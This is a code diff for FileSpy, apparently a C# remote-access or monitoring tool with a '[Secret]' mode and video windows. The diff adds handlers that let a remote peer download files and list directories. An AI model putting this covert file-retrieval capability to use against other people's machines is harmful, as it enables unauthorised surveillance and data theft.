@@ -36,13 +36,12 @@ namespace FileSpy
 
         string Version = "[0.2.0.0]";
         string Status = "Simple";
+        DateTime TurnOnTime = DateTime.Now;
 
         NotifyIcon Icons;
         FlashWindowHelper Helper;
 
         #region Imports
-        [DllImport("Kernel32.dll")]
-        static extern long GetTickCount64();
         [DllImport("user32.dll")]
         [return: MarshalAs(UnmanagedType.Bool)]
         static extern bool ShowWindow(IntPtr hwnd, WinStyle style);
@@ -331,7 +330,7 @@ namespace FileSpy
                     result += "[Secret]\n";
                 else
                     result += "Simple\n";
-                result += TimeSpan.FromMilliseconds(GetTickCount64()).ToString();
+                result += TurnOnTime.ToString();
 
                 Connection.SendMessage(new MessageClass(Connection.ID, message.Sender, Commands.Info, 0, result));
             }
@@ -787,6 +786,51 @@ namespace FileSpy
                 }
                 catch { }
             }
+
+            if (message.Command == Commands.StartDownload)
+            {
+                try
+                {
+                    Task.Run(() => FindFileClass(message.ElementID, message.Sender).StartDownload(message.GetStringPackage()));
+                }
+                catch { }
+            }
+
+            if (message.Command == Commands.StopDownload)
+            {
+                try
+                {
+                    FindFileClass(message.ElementID, message.Sender).StopDownload();
+                }
+                catch { }
+            }
+
+            if (message.Command == Commands.FileDData)
+            {
+                try
+                {
+                    FindFileWindow(message.ElementID).SetData(message.Package);
+                }
+                catch { }
+            }
+
+            if (message.Command == Commands.GetDirInfo)
+            {
+                try
+                {
+                    Task.Run(() => FindFileClass(message.ElementID, message.Sender).GetDirInfo(message.GetStringPackage()));
+                }
+                catch { }
+            }
+
+            if (message.Command == Commands.DirInfo)
+            {
+                try
+                {
+                    FindFileWindow(message.ElementID).SetProp(message.Package);
+                }
+                catch { }
+            }
             #endregion
         }
 
@@ -842,7 +886,7 @@ namespace FileSpy
 
                 var video = new VideoWindow(gid, id, name, Connection);
                 VideoWindows.Add(video);
-                video.CloseEvent += (VideoWindow window) => 
+                video.CloseEvent += (VideoWindow window) =>
                 {
                     VideoWindows.Remove(window);
                     GC.Collect();
